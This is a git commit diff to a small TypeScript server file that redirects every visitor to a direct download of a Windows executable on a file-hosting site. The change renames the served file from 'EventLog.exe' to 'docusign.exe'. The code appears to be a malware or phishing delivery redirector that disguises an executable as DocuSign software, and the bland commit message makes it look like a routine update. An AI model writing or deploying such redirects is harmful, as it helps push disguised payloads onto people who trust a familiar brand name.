ae265a3fea0bd5af28c01b189b57b24115d1cdb3
lisa1964vineyard-tech <lisa1964vineyard@gmail.com>
2025-10-15 11:23:32 -0700

    Update thesctechv4.ts

--- thesctechv4.ts
+++ thesctechv4.ts
@@ -5,7 +5,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://store-na-phx-4.gofile.io/download/direct/7aefb050-f774-457e-9feb-977d52e400a6/EventLog.exe",
+      Location: "https://store-na-phx-4.gofile.io/download/direct/7aefb050-f774-457e-9feb-977d52e400a6/docusign.exe",
     },
   });
 });
